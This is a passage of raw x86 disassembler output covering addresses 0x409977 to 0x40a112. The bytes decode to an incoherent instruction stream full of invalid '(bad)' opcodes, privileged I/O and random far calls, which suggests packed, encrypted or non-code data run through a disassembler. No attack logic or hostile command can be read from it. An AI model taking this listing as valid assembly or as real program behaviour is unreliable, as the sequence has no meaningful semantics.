  409977:	movlhps xmm4,xmm6
  40997a:	dec    edx
  40997b:	icebp  
  40997c:	jge    0x409994
  40997e:	scas   eax,DWORD PTR es:[edi]
  40997f:	mov    dl,0xe8
  409981:	loop   0x4099d9
  409983:	sbb    edi,DWORD PTR ds:0x711f9961
  409989:	adc    BYTE PTR [edi+0x594909b7],bh
  40998f:	(bad)  
  409990:	leave  
  409991:	and    BYTE PTR [ebx-0x46fc5753],al
  409997:	(bad)  
  409998:	out    dx,al
  409999:	scas   al,BYTE PTR es:[edi]
  40999a:	sbb    BYTE PTR [edi+0x4bc425f0],bh
  4099a0:	push   es
  4099a1:	xchg   ecx,esp
  4099a3:	popa   
  4099a4:	out    0x4c,al
  4099a6:	int3   
  4099a7:	push   0x9b740600
  4099ac:	jnp    0x4099a0
  4099ae:	call   0xa386:0xe626280a
  4099b5:	ja     0x409a22
  4099b7:	add    ch,al
  4099b9:	mov    ds:0x70bf0d0b,eax
  4099be:	in     eax,0x6b
  4099c0:	push   ebx
  4099c1:	shl    DWORD PTR [ebx+edi*4-0x36c0832f],0x18
  4099c9:	retf   
  4099ca:	out    0xa3,eax
  4099cc:	mov    eax,ds:0x2a1c7f76
  4099d1:	or     ebp,DWORD PTR [eax+0x4f]
  4099d4:	push   ecx
  4099d5:	adc    BYTE PTR [esi+0x4f],cl
  4099d8:	mov    edx,0x516caf15
  4099dd:	cmp    ah,BYTE PTR [edx+eax*4]
  4099e0:	pusha  
  4099e1:	mov    eax,0xb8bbbbc0
  4099e6:	arpl   WORD PTR [edi+0x32],di
  4099e9:	out    0x8,al
  4099eb:	mov    bl,0x75
  4099ed:	jecxz  0x4099d5
  4099ef:	xchg   DWORD PTR [edi+0x5d],esi
  4099f2:	(bad)  
  4099f3:	das    
  4099f4:	mov    dl,0xfa
  4099f6:	dec    ecx
  4099f7:	mov    dh,0x53
  4099f9:	sbb    al,0x28
  4099fb:	stc    
  4099fc:	sub    eax,esp
  4099fe:	sbb    DWORD PTR [eax],edx
  409a00:	mov    BYTE PTR [eax+esi*4-0x80],dh
  409a04:	fisttp WORD PTR [edx-0x78]
  409a07:	pop    edx
  409a08:	pop    edi
  409a09:	clc    
  409a0a:	inc    ebp
  409a0b:	dec    edx
  409a0c:	adc    al,0x94
  409a0e:	imul   edi,DWORD PTR [ecx+ecx*4-0x47],0xffffffd4
  409a13:	mov    bl,0x58
  409a15:	dec    esi
  409a16:	dec    esp
  409a17:	in     eax,dx
  409a18:	dec    ebx
  409a19:	imul   edx,DWORD PTR [edi-0x5],0xca04925
  409a20:	std    
  409a21:	(bad)  
  409a22:	in     eax,0x5a
  409a24:	pop    edi
  409a25:	shl    BYTE PTR [esi-0x671f61a0],1
  409a2b:	ins    DWORD PTR es:[edi],dx
  409a2c:	lods   al,BYTE PTR ds:[esi]
  409a2d:	(bad)  
  409a2e:	xor    edx,DWORD PTR [ecx+edx*8-0x17]
  409a32:	sbb    BYTE PTR [eax+ebx*8+0x543dd265],ah
  409a39:	jno    0x4099f1
  409a3b:	jns    0x409a1b
  409a3d:	add    al,0x10
  409a3f:	icebp  
  409a40:	add    DWORD PTR [ecx-0x6a],ebx
  409a43:	aam    0xf9
  409a45:	enter  0x4022,0xf1
  409a49:	icebp  
  409a4a:	dec    ebx
  409a4b:	pusha  
  409a4c:	retf   
  409a4d:	lods   al,BYTE PTR ds:[esi]
  409a4e:	fucomip st,st(5)
  409a50:	mov    ds:0x9e1893e5,al
  409a55:	sub    eax,0x92143019
  409a5a:	daa    
  409a5b:	rcl    DWORD PTR [edx-0x43dc2511],cl
  409a61:	push   0xfb989fe9
  409a66:	in     eax,0x1f
  409a68:	(bad)  
  409a6a:	cmp    DWORD PTR [edx],edi
  409a6c:	pop    eax
  409a6d:	jb     0x409a3e
  409a6f:	inc    edx
  409a70:	xchg   esp,eax
  409a71:	push   edi
  409a72:	push   cs
  409a73:	movd   mm2,DWORD PTR [esi-0x7c445700]
  409a7a:	jo     0x409acc
  409a7c:	sti    
  409a7d:	cmp    eax,0x7e5f79f8
  409a82:	fistp  QWORD PTR [eax]
  409a84:	add    ecx,esp
  409a86:	mov    bh,0x21
  409a88:	adc    dh,cl
  409a8a:	stos   DWORD PTR es:[edi],eax
  409a8b:	jns    0x409afd
  409a8d:	imul   ecx,DWORD PTR [eax-0xd],0xffffffbc
  409a91:	mov    dl,0x1d
  409a93:	jmp    FWORD PTR [eax-0x5]
  409a96:	sbb    esi,0xffffffc9
  409a99:	lahf   
  409a9a:	push   edi
  409a9b:	mov    al,0x86
  409a9d:	jnp    0x409a28
  409a9f:	leave  
  409aa0:	cmp    eax,0x61c631c3
  409aa5:	loop   0x409a77
  409aa7:	(bad)  
  409aa8:	call   0xfd64:0x5463c9f2
  409aaf:	pop    ds
  409ab0:	loop   0x409a89
  409ab2:	jb     0x409aac
  409ab4:	cwde   
  409ab5:	dec    esp
  409ab6:	mov    edx,0x52941306
  409abb:	addr16 loopne 0x409b14
  409abe:	jo     0x409a52
  409ac0:	ror    esp,1
  409ac2:	and    BYTE PTR [edx+0x42],dh
  409ac5:	xor    bl,BYTE PTR fs:[ecx]
  409ac8:	pop    es
  409ac9:	cmp    DWORD PTR [edi],ebp
  409acb:	adc    edi,ebx
  409acd:	jno    0x409a98
  409acf:	cmp    ch,BYTE PTR [ebp+0x12]
  409ad2:	pop    ebx
  409ad3:	inc    edx
  409ad4:	push   ds
  409ad5:	outs   dx,BYTE PTR ds:[esi]
  409ad6:	mov    edi,0x96b007a8
  409adb:	(bad)  
  409adc:	pusha  
  409add:	xor    al,0x17
  409adf:	bound  esp,QWORD PTR gs:[edx+0x200c39f1]
  409ae6:	xlat   BYTE PTR ds:[ebx]
  409ae7:	aad    0x76
  409ae9:	push   edx
  409aea:	pop    ecx
  409aeb:	cmp    cl,ah
  409aed:	pusha  
  409aee:	sbb    BYTE PTR [edi],cl
  409af0:	jno    0x409ae9
  409af2:	push   cs
  409af3:	mov    eax,ds:0x821c77aa
  409af8:	and    BYTE PTR [esi],ch
  409afa:	jg     0x409b20
  409afc:	pop    esi
  409afd:	out    dx,al
  409afe:	mov    ds:0x8e6e940d,eax
  409b03:	or     esp,DWORD PTR [ebp+0x3a]
  409b06:	or     ch,BYTE PTR [ebx+0x24]
  409b09:	pop    ebx
  409b0a:	test   DWORD PTR [esi+0x12],0xf956e899
  409b11:	ins    DWORD PTR es:[edi],dx
  409b12:	dec    edx
  409b13:	mov    al,0xfe
  409b15:	popa   
  409b16:	lods   eax,DWORD PTR ds:[esi]
  409b17:	call   0xf5d0:0xb5c8dc90
  409b1e:	mov    esp,0xab11596
  409b23:	mov    ah,0xe9
  409b25:	jmp    0xbf5d:0xb0cbed57
  409b2c:	xor    BYTE PTR [esi],cl
  409b2e:	daa    
  409b2f:	and    esi,DWORD PTR [esi]
  409b31:	dec    ebx
  409b32:	(bad)  
  409b33:	pop    edx
  409b34:	ret    
  409b35:	fisubr DWORD PTR [eax+0x7a]
  409b38:	out    dx,eax
  409b39:	inc    esi
  409b3a:	add    dl,BYTE PTR [esi+0x47]
  409b3d:	jg     0x409ad6
  409b3f:	inc    esp
  409b40:	mov    ds,WORD PTR [eax]
  409b42:	sub    DWORD PTR [ebx+0x5e],edi
  409b45:	sub    BYTE PTR [ecx+0x1d],al
  409b48:	sbb    ah,BYTE PTR ds:0xbccee4d7
  409b4e:	mov    WORD PTR [ebx+eax*2-0x63],ds
  409b52:	mov    esp,0x550446d
  409b57:	sbb    DWORD PTR ds:[edx+eiz*2-0x1e615aaa],esi
  409b5f:	or     al,bh
  409b61:	push   eax
  409b62:	ret    0xda68
  409b65:	mov    ecx,0x77fe5266
  409b6a:	out    dx,eax
  409b6b:	pusha  
  409b6c:	mov    cl,0xa1
  409b6e:	in     eax,dx
  409b6f:	in     eax,dx
  409b70:	add    eax,0x3730eda7
  409b75:	int3   
  409b76:	mov    edi,0xeabf312
  409b7b:	out    0x8a,eax
  409b7d:	mov    al,ds:0x9dede9ae
  409b82:	cli    
  409b83:	stc    
  409b84:	fnstsw WORD PTR [ebp+0x64745e36]
  409b8a:	mov    dl,0x40
  409b8c:	push   ss
  409b8d:	mov    eax,cs:0xcf0db792
  409b93:	sbb    al,BYTE PTR [edx+0xd485bea]
  409b99:	retf   
  409b9a:	xchg   esi,eax
  409b9b:	push   ecx
  409b9c:	mov    BYTE PTR [esi-0x64182668],bh
  409ba2:	and    BYTE PTR [esi-0x2d],ah
  409ba5:	fwait
  409ba6:	mov    esi,0x158c7cb9
  409bab:	push   eax
  409bac:	adc    eax,0x62bc428b
  409bb1:	inc    esp
  409bb2:	pop    edi
  409bb3:	shl    DWORD PTR [edi-0x656faf65],1
  409bb9:	mov    ds,edi
  409bbb:	cld    
  409bbc:	fisttp QWORD PTR [ebp+0x55]
  409bbf:	enter  0x8c68,0x2a
  409bc3:	loopne 0x409b67
  409bc5:	xchg   ecx,eax
  409bc6:	xlat   BYTE PTR ds:[ebx]
  409bc7:	aam    0x81
  409bc9:	mov    cl,0x1b
  409bcb:	ds push 0xffffff81
  409bce:	mov    ah,0xe0
  409bd0:	ins    BYTE PTR es:[edi],dx
  409bd1:	neg    BYTE PTR ds:0x5248d4d8
  409bd7:	mov    cl,0x7b
  409bd9:	retf   
  409bda:	hlt    
  409bdb:	pop    edx
  409bdc:	aam    0xbb
  409bde:	xor    esi,DWORD PTR [edx+0x7acb277f]
  409be4:	sbb    BYTE PTR [eax+0x70],ch
  409be7:	xchg   esp,eax
  409be8:	pop    ebx
  409be9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409bea:	dec    ebp
  409beb:	mov    cl,0x58
  409bed:	push   es
  409bee:	test   ebx,edi
  409bf0:	fs sahf 
  409bf2:	ficom  DWORD PTR [esi+0x123fa797]
  409bf8:	xor    eax,0x4da537fb
  409bfd:	mov    ds:0x6f0a3d3,al
  409c02:	lds    ecx,FWORD PTR [esi-0x15]
  409c05:	les    ebx,FWORD PTR [ecx-0x4f80b70d]
  409c0b:	inc    edi
  409c0c:	stos   BYTE PTR es:[edi],al
  409c0d:	sar    BYTE PTR [esi],0x50
  409c10:	mov    ebx,0xad6e9d71
  409c15:	cld    
  409c16:	jecxz  0x409c4b
  409c18:	mov    edi,0x305abf54
  409c1d:	mov    bh,0x72
  409c1f:	xor    eax,0xfc8a4e7d
  409c24:	or     eax,0x1cbabcac
  409c29:	mov    DWORD PTR [edi+0x43],edx
  409c2c:	iret   
  409c2d:	jne    0x409bfe
  409c2f:	lock (bad) 
  409c31:	jnp    0x409bff
  409c33:	stos   BYTE PTR es:[di],al
  409c35:	dec    ecx
  409c36:	fidivr DWORD PTR [edi+edi*2-0xac72529]
  409c3d:	mov    ebp,0xf2f60da8
  409c42:	push   0x39886d85
  409c47:	push   es
  409c48:	outs   dx,DWORD PTR ds:[esi]
  409c49:	arpl   WORD PTR [esi],si
  409c4b:	adc    eax,DWORD PTR [ecx]
  409c4d:	ror    DWORD PTR [esi],cl
  409c4f:	cmp    al,0xb9
  409c51:	pop    edx
  409c52:	push   esp
  409c53:	mov    ah,0x3d
  409c55:	cmp    al,0xb3
  409c57:	leave  
  409c58:	outs   dx,BYTE PTR ds:[esi]
  409c59:	nop
  409c5a:	jnp    0x409c4b
  409c5c:	into   
  409c5d:	in     eax,dx
  409c5e:	idiv   BYTE PTR [esi-0x4a]
  409c61:	cmp    al,0x5b
  409c63:	sub    al,0xd6
  409c65:	mov    bh,0xb7
  409c67:	jbe    0x409ca9
  409c69:	ja     0x409cbc
  409c6b:	pop    esp
  409c6c:	sbb    eax,0x5b386482
  409c71:	test   BYTE PTR [ecx+0x32b335a5],dl
  409c77:	sbb    al,0x62
  409c79:	xchg   edi,eax
  409c7a:	add    DWORD PTR [esi+edi*1],eax
  409c7d:	sti    
  409c7e:	cmp    dh,BYTE PTR [ebx]
  409c80:	xchg   edi,eax
  409c81:	mov    dl,0x9f
  409c83:	das    
  409c84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409c85:	xor    BYTE PTR [ecx-0x59],0xa0
  409c89:	icebp  
  409c8a:	cdq    
  409c8b:	xchg   edi,eax
  409c8c:	jecxz  0x409cf9
  409c8e:	cdq    
  409c8f:	pop    edx
  409c90:	xchg   BYTE PTR [edi-0x66f66951],ah
  409c96:	out    0xf7,al
  409c98:	jmp    0x881b4b34
  409c9d:	pop    ebx
  409c9e:	and    ecx,DWORD PTR [ebx+0x74]
  409ca1:	in     eax,0x41
  409ca3:	repnz cmp DWORD PTR [ebx-0x22],esi
  409ca7:	jb     0x409caa
  409ca9:	loop   0x409c73
  409cab:	pop    es
  409cac:	test   BYTE PTR [ecx-0x2a],cl
  409caf:	fistp  WORD PTR [esi-0x77]
  409cb2:	cmp    al,0xc8
  409cb4:	loope  0x409d13
  409cb6:	rcl    BYTE PTR [ebx+0x4d],cl
  409cb9:	inc    edi
  409cba:	push   edi
  409cbb:	ja     0x409cb7
  409cbd:	in     al,0xcc
  409cbf:	mov    bh,0xfe
  409cc1:	sub    ch,BYTE PTR [edx]
  409cc3:	leave  
  409cc4:	cmp    ch,BYTE PTR [esi]
  409cc6:	inc    eax
  409cc7:	test   ebp,ebx
  409cc9:	mov    edi,0xc2cf664
  409cce:	ret    
  409ccf:	or     al,0x4
  409cd1:	test   BYTE PTR [ecx],0xe1
  409cd4:	arpl   WORD PTR [edi-0x6e7c9eb],bp
  409cda:	iret   
  409cdb:	pop    ebx
  409cdc:	jno    0x409ca5
  409cde:	jne    0x409ce1
  409ce0:	in     al,dx
  409ce1:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409ce3:	push   eax
  409ce4:	lds    ebx,FWORD PTR [ecx+0x4ee3d313]
  409cea:	jnp    0x409cc9
  409cec:	sub    dl,cl
  409cee:	jo     0x409d4b
  409cf0:	rol    DWORD PTR [edx],0x1a
  409cf3:	mov    edi,0x5af9695d
  409cf8:	fidiv  DWORD PTR [edx]
  409cfa:	sub    ebp,esp
  409cfc:	mov    cl,0xf3
  409cfe:	inc    ebx
  409cff:	nop
  409d00:	call   0x198fd745
  409d05:	jp     0x409d3b
  409d07:	stos   DWORD PTR es:[edi],eax
  409d08:	push   es
  409d09:	fs test ebx,ecx
  409d0c:	lds    esp,FWORD PTR [ecx-0x58d914be]
  409d12:	mov    ds:0xaf43c657,al
  409d17:	push   edi
  409d18:	ja     0x409ca8
  409d1a:	add    BYTE PTR [esi+0x4368906d],bh
  409d20:	xor    al,0xfa
  409d22:	and    BYTE PTR [ebx],bl
  409d24:	int    0x3d
  409d26:	nop
  409d27:	xchg   DWORD PTR [ecx-0x2d],eax
  409d2a:	and    dh,BYTE PTR [ebp-0x4f]
  409d2d:	dec    edi
  409d2e:	pop    ecx
  409d2f:	loop   0x409d83
  409d31:	jne    0x409cee
  409d33:	jmp    0x4414:0x50cafe60
  409d3a:	or     dl,BYTE PTR [edi-0x27]
  409d3d:	jle    0x409cf1
  409d3f:	lahf   
  409d40:	dec    esp
  409d41:	pop    es
  409d42:	test   al,0xec
  409d44:	push   ss
  409d45:	pmaxub mm0,QWORD PTR [esi+0x31]
  409d49:	fnstenv [ebx+0x72]
  409d4c:	xor    ebp,DWORD PTR [edi+ecx*2+0x60]
  409d50:	mov    ebp,0xec6dad10
  409d55:	push   ss
  409d56:	and    eax,0xddba0be2
  409d5b:	leave  
  409d5c:	mov    edi,0xc6b13cae
  409d61:	scas   al,BYTE PTR es:[edi]
  409d62:	cs adc eax,0x45e0acae
  409d68:	sub    ch,dl
  409d6a:	sub    eax,0xaf0836e1
  409d6f:	sbb    bl,0x26
  409d72:	or     eax,0xc170c318
  409d77:	es mov bh,0x61
  409d7a:	out    dx,al
  409d7b:	add    ebx,ebx
  409d7d:	cmc    
  409d7e:	cmp    dh,BYTE PTR [ecx-0x476c3d61]
  409d84:	frstor [ebp-0x5]
  409d87:	stos   DWORD PTR es:[edi],eax
  409d88:	aam    0x26
  409d8a:	adc    DWORD PTR [edx],0x4d
  409d8d:	dec    ecx
  409d8e:	xor    eax,0x19ee879e
  409d93:	sbb    eax,0xd063d695
  409d98:	lea    ecx,[ebx+ecx*2+0x10]
  409d9c:	shr    DWORD PTR [edx-0x310ca797],1
  409da2:	dec    edx
  409da3:	fisub  WORD PTR [ebp+0x707071bd]
  409da9:	mov    eax,0x7afb5164
  409dae:	inc    ecx
  409daf:	push   cs
  409db0:	and    DWORD PTR [edi],edi
  409db2:	or     BYTE PTR [ecx-0x3d970339],dl
  409db8:	jne    0x409de2
  409dba:	xor    al,0x22
  409dbd:	xor    BYTE PTR es:[esi-0x11bcf26e],0x8d
  409dc5:	cmp    eax,0x4ffc8291
  409dca:	mov    esp,0x194cc794
  409dcf:	cmp    BYTE PTR [edi],0xa1
  409dd2:	sub    dl,BYTE PTR [eax+0x71c3af5f]
  409dd8:	xor    al,0xa7
  409dda:	pop    esp
  409ddb:	ficom  WORD PTR [esi+0x5e5cd034]
  409de1:	out    dx,al
  409de2:	jbe    0x409deb
  409de4:	or     BYTE PTR [ebp+0x8cfe488],dh
  409dea:	and    DWORD PTR [edx],edx
  409dec:	pop    esp
  409ded:	push   0x69
  409def:	push   edi
  409df0:	mov    BYTE PTR [eax+0x6f],ch
  409df3:	not    BYTE PTR [edi]
  409df5:	xchg   ebx,eax
  409df6:	icebp  
  409df7:	(bad)  
  409df8:	outs   dx,DWORD PTR ds:[esi]
  409df9:	pop    esi
  409dfa:	dec    esi
  409dfb:	imul   esp,DWORD PTR gs:[ebx+0x3],0xffffffea
  409e00:	test   al,0xe3
  409e02:	leave  
  409e03:	lahf   
  409e04:	int    0x5b
  409e06:	(bad)  
  409e07:	int3   
  409e08:	scas   al,BYTE PTR es:[edi]
  409e09:	or     al,0x34
  409e0b:	jge    0x409e31
  409e0d:	jns    0x409de6
  409e0f:	or     al,0xfe
  409e11:	idiv   BYTE PTR [ebx-0x2ebaf2d2]
  409e17:	adc    al,0x98
  409e19:	push   cs
  409e1a:	lds    ebx,FWORD PTR [edi-0x5f3f9ab1]
  409e20:	icebp  
  409e21:	mov    ah,0x9c
  409e23:	mov    bl,0xb5
  409e25:	add    eax,0x48966e72
  409e2a:	and    eax,0xa0de5884
  409e2f:	loopne 0x409dc2
  409e31:	(bad)  
  409e32:	pop    ebp
  409e33:	jge    0x409e4a
  409e35:	or     ebx,DWORD PTR [ebx+0x7d]
  409e38:	ror    BYTE PTR [edi-0x23d9da90],1
  409e3e:	popa   
  409e3f:	test   DWORD PTR [edx-0x37231bf1],eax
  409e45:	inc    esi
  409e46:	das    
  409e47:	mov    ah,0xbc
  409e49:	jl     0x409ec8
  409e4b:	out    dx,al
  409e4c:	fwait
  409e4d:	mov    cl,0xc3
  409e4f:	ss stos DWORD PTR es:[edi],eax
  409e51:	push   eax
  409e52:	(bad)  
  409e53:	mul    DWORD PTR [ecx+0x4a]
  409e56:	and    DWORD PTR [ebp-0x5f],esi
  409e59:	fnsave [edi-0x42]
  409e5c:	xor    eax,0x72cf3018
  409e61:	xor    ecx,esi
  409e63:	test   eax,0xef6f1f3c
  409e68:	cmp    BYTE PTR [ebx-0x9],bh
  409e6b:	pop    edi
  409e6c:	pop    ebx
  409e6d:	mov    esp,0xfdd17a0e
  409e72:	cmp    DWORD PTR [ecx],0x4b4542c6
  409e78:	repz (bad) 
  409e7a:	out    0x46,al
  409e7c:	mov    ebp,DWORD PTR [edi+0x16c59ba3]
  409e82:	pop    ebx
  409e83:	lods   al,BYTE PTR ds:[esi]
  409e84:	and    BYTE PTR [edx+0x38],cl
  409e87:	ins    DWORD PTR es:[edi],dx
  409e88:	mov    ch,0x16
  409e8a:	(bad)  
  409e8b:	ss addr16 dec ecx
  409e8e:	sub    eax,0x4fb8b9de
  409e93:	out    0x29,al
  409e95:	nop
  409e96:	cmp    BYTE PTR [edx-0x43],ch
  409e99:	adc    DWORD PTR [ebp+0x5e62f5fe],ebx
  409e9f:	dec    edx
  409ea0:	test   DWORD PTR [eax],ebp
  409ea2:	sub    al,0x8b
  409ea4:	outs   dx,DWORD PTR ds:[esi]
  409ea5:	sub    ecx,esi
  409ea7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409ea8:	pop    ds
  409ea9:	bound  ebp,QWORD PTR [ebp-0x5022961d]
  409eaf:	xor    DWORD PTR [esp+0x31],ecx
  409eb3:	sahf   
  409eb4:	pusha  
  409eb5:	sbb    edx,0x19fed399
  409ebb:	or     DWORD PTR [ecx*1+0x3c738114],edi
  409ec2:	std    
  409ec3:	xchg   esi,eax
  409ec4:	and    eax,0x4a097dfa
  409ec9:	aaa    
  409eca:	lahf   
  409ecb:	adc    eax,0x256690b4
  409ed0:	lods   al,BYTE PTR ds:[esi]
  409ed1:	clc    
  409ed2:	clc    
  409ed3:	aam    0x7
  409ed5:	retf   0xdcd5
  409ed8:	je     0x409eab
  409eda:	sbb    ch,bh
  409edc:	mov    esp,0x73720e4e
  409ee1:	and    al,0xb4
  409ee3:	push   DWORD PTR [edi]
  409ee5:	push   ebp
  409ee6:	sub    eax,0x0
  409ee9:	enter  0x600a,0x8c
  409eed:	inc    eax
  409eee:	jo     0x409f1d
  409ef0:	add    al,0x87
  409ef2:	and    al,0x4f
  409ef4:	add    eax,DWORD PTR [eax-0x5af50946]
  409efa:	repnz push ds
  409efc:	es sbb al,0xa
  409eff:	data16 out dx,al
  409f01:	loopne 0x409f39
  409f03:	out    dx,al
  409f04:	sbb    DWORD PTR es:[eax],eax
  409f07:	call   0xce3:0x16e4c7b3
  409f0e:	ror    BYTE PTR [ecx],cl
  409f10:	loopne 0x409f1a
  409f12:	jecxz  0x409ef9
  409f14:	shr    BYTE PTR [edi-0x19],cl
  409f17:	call   0xa9f9925c
  409f1c:	mov    ecx,0xa5708a5d
  409f21:	sub    DWORD PTR [edi+0x7c79ff07],0x12
  409f28:	rcl    BYTE PTR [ebp+0x1],1
  409f2b:	iret   
  409f2c:	bound  ecx,QWORD PTR [ecx-0x78]
  409f2f:	jno    0x409ebb
  409f31:	arpl   WORD PTR [ebp-0x15],bx
  409f34:	addr16 mov al,0x5f
  409f37:	in     eax,dx
  409f38:	inc    ecx
  409f39:	repnz push esp
  409f3b:	push   ecx
  409f3c:	sbb    edx,DWORD PTR [esi]
  409f3e:	mov    WORD PTR [ebx+0x60],es
  409f41:	call   0x63a2:0x67725b2f
  409f48:	sub    DWORD PTR [ebp+0x3e],edx
  409f4b:	and    al,0x2
  409f4d:	jae    0x409f73
  409f4f:	bswap  ebp
  409f51:	call   0x210c:0x295ddb4b
  409f58:	inc    edi
  409f59:	(bad)  
  409f5a:	outs   dx,BYTE PTR ds:[esi]
  409f5b:	lea    eax,[esi+0xaba0070]
  409f61:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f62:	aad    0x5e
  409f64:	pop    eax
  409f65:	repz test eax,esi
  409f68:	push   edx
  409f69:	addr16 sbb eax,eax
  409f6c:	xor    ebp,DWORD PTR [ecx-0x8]
  409f6f:	xchg   ebx,eax
  409f70:	pop    es
  409f71:	iret   
  409f72:	push   ebx
  409f73:	push   0xffffffe5
  409f75:	xchg   ebx,eax
  409f76:	enter  0xae3b,0xff
  409f7a:	into   
  409f7b:	dec    eax
  409f7c:	mov    ?,WORD PTR [ebx]
  409f7e:	mov    dl,0x14
  409f80:	push   ecx
  409f81:	lahf   
  409f82:	out    dx,al
  409f83:	retf   0xfc40
  409f86:	pop    ecx
  409f87:	xor    eax,DWORD PTR [edi]
  409f89:	adc    DWORD PTR ds:0x82f24bde,edx
  409f8f:	jmp    DWORD PTR [eax+0x79773379]
  409f95:	and    eax,0xd8038df1
  409f9a:	xor    BYTE PTR [esi],al
  409f9c:	retf   0x9435
  409f9f:	mov    ds:0xea3d825d,al
  409fa4:	xchg   edi,eax
  409fa5:	xor    DWORD PTR [esi-0x72cede4d],0x1b93eed7
  409faf:	dec    esp
  409fb0:	xchg   esp,eax
  409fb1:	jb     0x409f3b
  409fb3:	pop    esi
  409fb4:	cmp    ecx,DWORD PTR [edx-0x6c]
  409fb7:	jmp    0x409fe2
  409fb9:	out    dx,eax
  409fba:	xchg   ebx,eax
  409fbb:	fist   WORD PTR [ebp+0x219e6925]
  409fc1:	mov    ebx,ss
  409fc3:	cli    
  409fc4:	cmp    al,BYTE PTR [eax+0x64]
  409fc7:	mov    esi,0x674748d3
  409fcc:	addr16 xchg ebp,eax
  409fce:	jne    0x40a025
  409fd0:	ins    BYTE PTR es:[edi],dx
  409fd1:	mul    DWORD PTR [ecx]
  409fd3:	out    0xfe,eax
  409fd5:	scas   al,BYTE PTR es:[edi]
  409fd6:	ins    DWORD PTR es:[edi],dx
  409fd7:	xlat   BYTE PTR ds:[ebx]
  409fd8:	das    
  409fd9:	sub    ah,BYTE PTR [eax]
  409fdb:	pop    eax
  409fdc:	xchg   esi,eax
  409fdd:	je     0x40a010
  409fdf:	push   ecx
  409fe0:	adc    eax,0x1f71be73
  409fe5:	mov    edx,0xe09657e3
  409fea:	mov    bh,bl
  409fec:	mov    cl,0x90
  409fee:	and    al,0x87
  409ff0:	rol    dh,1
  409ff2:	sbb    edx,DWORD PTR [ecx]
  409ff4:	dec    esi
  409ff5:	or     DWORD PTR ds:0x182da865,ebx
  409ffb:	dec    eax
  409ffc:	gs iret 
  409ffe:	dec    ebx
  409fff:	lods   al,BYTE PTR ds:[esi]
  40a000:	cld    
  40a001:	inc    ebp
  40a002:	popf   
  40a003:	call   0x365e10b9
  40a008:	outs   dx,DWORD PTR ds:[esi]
  40a009:	fisubr WORD PTR [ecx+0x61]
  40a00c:	in     al,dx
  40a00d:	xchg   esp,eax
  40a00e:	inc    ebp
  40a010:	stos   BYTE PTR es:[edi],al
  40a011:	aas    
  40a012:	call   0x9e289ae0
  40a017:	pop    esp
  40a018:	add    ecx,DWORD PTR [ebx-0x3e]
  40a01b:	jge    0x409fed
  40a01d:	sub    DWORD PTR [eax+0x56],esp
  40a020:	xchg   esp,eax
  40a021:	jmp    0xce900e31
  40a026:	push   cs
  40a027:	icebp  
  40a028:	clc    
  40a029:	xchg   esp,eax
  40a02a:	cli    
  40a02b:	sbb    BYTE PTR [ecx],cl
  40a02d:	push   cs
  40a02e:	push   esp
  40a02f:	jecxz  0x409fb8
  40a031:	sbb    bh,BYTE PTR [eax-0x38fdedee]
  40a037:	sar    BYTE PTR ds:0x7a4e918b,1
  40a03d:	(bad)  
  40a03e:	push   0xffffffcd
  40a040:	(bad)  
  40a041:	dec    edi
  40a042:	gs sbb al,0xc2
  40a045:	add    bh,BYTE PTR [ebp+0x40]
  40a048:	stc    
  40a049:	loopne 0x40a0bb
  40a04b:	out    dx,eax
  40a04c:	xchg   esp,eax
  40a04d:	jbe    0x40a04c
  40a04f:	xchg   esp,eax
  40a050:	fild   QWORD PTR [ebp+edi*2-0x7e]
  40a054:	ret    
  40a055:	jmp    0x40a009
  40a057:	sbb    eax,0x27027135
  40a05c:	cwde   
  40a05d:	sbb    ah,0x13
  40a060:	les    edx,FWORD PTR [eax]
  40a062:	out    dx,eax
  40a063:	in     al,dx
  40a064:	aad    0x12
  40a066:	push   edx
  40a067:	sbb    al,0xfd
  40a069:	into   
  40a06a:	aam    0x52
  40a06c:	std    
  40a06d:	dec    ecx
  40a06e:	xchg   edx,eax
  40a06f:	mov    ebp,0x3c9d8bf5
  40a074:	sbb    DWORD PTR [esi-0x697f08d0],ebx
  40a07a:	clc    
  40a07b:	push   ecx
  40a07c:	xchg   esi,eax
  40a07d:	push   ds
  40a07e:	cmp    ch,0x87
  40a081:	inc    ebx
  40a082:	mov    ebp,0x6873e4ac
  40a087:	jno    0x40a0f6
  40a089:	shr    DWORD PTR [eax+0x54],cl
  40a08c:	in     eax,dx
  40a08d:	jb     0x40a08f
  40a08f:	shl    DWORD PTR ds:0x8a13443,0x73
  40a096:	or     BYTE PTR [edx-0x8],bh
  40a099:	push   0xfffffff5
  40a09b:	jmp    FWORD PTR ds:0x9ae7f30d
  40a0a1:	xor    BYTE PTR [esi+0x76],ah
  40a0a4:	adc    al,0x35
  40a0a7:	pusha  
  40a0a8:	jl     0x40a034
  40a0aa:	mov    ebx,DWORD PTR [edx]
  40a0ac:	or     eax,0x62dcdea4
  40a0b1:	packssdw mm4,QWORD PTR [ebp+0x25505a]
  40a0b8:	jno    0x40a068
  40a0ba:	mov    ds:0xf44ea2d4,eax
  40a0bf:	mov    al,0x4e
  40a0c1:	call   0x8a93:0xfc918900
  40a0c8:	rcr    eax,0xc5
  40a0cb:	inc    edi
  40a0cc:	lods   eax,DWORD PTR ds:[esi]
  40a0cd:	push   di
  40a0cf:	addr16 js 0x40a0ae
  40a0d2:	(bad)  
  40a0d3:	dec    ecx
  40a0d4:	mov    esi,0x73768a2b
  40a0d9:	lea    esi,[ebx]
  40a0db:	in     eax,0x3e
  40a0dd:	(bad)  
  40a0de:	call   0xa1faac2c
  40a0e3:	cli    
  40a0e4:	pop    ss
  40a0e5:	clc    
  40a0e6:	cmp    BYTE PTR [ecx-0x31],dh
  40a0e9:	sahf   
  40a0ea:	cmp    eax,0x158d4c29
  40a0ef:	sub    eax,0x5dbe56b1
  40a0f4:	lahf   
  40a0f5:	mov    al,0xff
  40a0f7:	fidiv  WORD PTR [ebx+0x65]
  40a0fa:	pop    esp
  40a0fb:	(bad)  
  40a0fc:	fimul  DWORD PTR [ebx+edx*2-0x7442f3ac]
  40a103:	iret   
  40a104:	dec    edi
  40a105:	mul    BYTE PTR [esi+0x6d]
  40a108:	retf   
  40a109:	push   ecx
  40a10a:	outs   dx,DWORD PTR ds:[esi]
  40a10b:	mov    dh,0x75
  40a10d:	popf   
  40a10e:	lds    ebp,FWORD PTR [ebx+esi*2+0x11]
  40a112:	retf   
